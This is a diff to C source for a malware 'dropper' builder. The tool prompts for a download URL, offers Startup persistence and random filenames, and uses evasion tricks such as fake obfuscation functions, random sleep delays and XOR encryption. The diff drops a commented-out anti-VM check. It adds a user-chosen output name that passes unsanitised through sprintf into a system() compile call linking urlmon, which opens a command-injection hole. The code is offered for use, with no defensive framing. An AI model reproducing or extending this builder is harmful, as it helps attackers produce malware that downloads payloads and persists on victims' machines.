@@ -29,18 +29,6 @@ void xor_encrypt(char* data, int length) {
     }
 }
 
-// // Anti-VM check (basic detection for VM environment)
-// int check_for_vm() {
-//     SYSTEM_INFO sysInfo;
-//     GetSystemInfo(&sysInfo);
-
-//     if (sysInfo.dwProcessorType == PROCESSOR_ARCHITECTURE_INTEL) {
-//         return 0; // Not a VM (simple example, you'd need more checks here)
-//     }
-    
-//     return 1; // Potential VM environment detected
-// }
-
 // Function to simulate random delay (for evasion)
 void simulate_delay() {
     Sleep(rand() % 3000 + 1000);
@@ -63,16 +51,11 @@ int main() {
     char filename_option[10];
     char persistence_option[10];
     char random_filename[20];
+    char output_name[100];
 
     // Fake functions for obfuscation
     fake_function_1();
     fake_function_2();
-
-    // Anti-VM Check
-    // if (check_for_vm()) {
-    //     printf("VM detected, aborting...\n");
-    //     return 1;
-    // }
 
     printf("Enter URL to download from (or leave blank for default): ");
     fgets(url, sizeof(url), stdin);
@@ -97,6 +80,13 @@ int main() {
     printf("Add Persistence to Startup? (yes/no): ");
     fgets(persistence_option, sizeof(persistence_option), stdin);
     persistence_option[strcspn(persistence_option, "\n")] = 0;
+
+    printf("Enter output filename (without .exe): ");
+    fgets(output_name, sizeof(output_name), stdin);
+    output_name[strcspn(output_name, "\n")] = 0;
+    if (strlen(output_name) == 0) {
+        strcpy(output_name, "dropper");
+    }
 
     if (strcmp(filename_option, "yes") == 0) {
         generate_random_string(random_filename, 10);
@@ -166,10 +156,13 @@ int main() {
     printf("\nDropper source created: 'dropper.c'.\n");
 
     // Compile the dropper immediately
+    char compile_command[200];
+    sprintf(compile_command, "gcc dropper.c -o %s.exe -lurlmon", output_name);
+
     printf("\nCompiling dropper.c... Please wait...\n");
-    int compile_result = system("gcc dropper.c -o dropper.exe");
+    int compile_result = system(compile_command);
     if (compile_result == 0) {
-        printf("Dropper compiled successfully: 'dropper.exe'.\n");
+        printf("Dropper compiled successfully: '%s.exe'.\n", output_name);
     } else {
         printf("Compilation failed.\n");
     }
